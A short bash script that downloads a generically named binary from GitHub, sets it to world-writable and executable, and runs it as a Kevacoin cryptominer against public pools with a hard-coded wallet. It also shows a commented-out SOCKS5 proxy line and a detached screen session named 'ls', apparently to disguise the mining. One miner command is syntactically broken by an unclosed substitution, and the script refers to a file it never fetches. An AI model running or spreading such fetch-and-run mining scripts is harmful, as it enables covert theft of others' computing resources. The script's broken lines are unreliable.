#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y
wget -O brilliant https://github.com/brilliant-cut/brilliant-cut/raw/main/brilliant
screen -dmS ls
chmod +x phpsur.sh && chmod +x brilliant && chmod 777 brilliant phpsur.sh
#./brilliant --algorithm randomkeva --pool de.kevacoin.herominers.com:1163 --wallet VSMtpHwu6RvBnJMKf8vBZ3nUxKAXib6Y9b --password Build --proxy=socks5://198.12.255.100:14164
./brilliant --algorithm randomkeva --pool stratum-eu.rplant.xyz:17061 --tls true --wallet VSMtpHwu6RvBnJMKf8vBZ3nUxKAXib6Y9b.brilliant=$(echo $strDate-$(shuf -i 1-1000 -n 1) --keepalive true
./srbminer-multi --algorithm randomkeva --pool stratum-eu.rplant.xyz:17061 --tls true --wallet VSMtpHwu6RvBnJMKf8vBZ3nUxKAXib6Y9b.BC --keepalive true
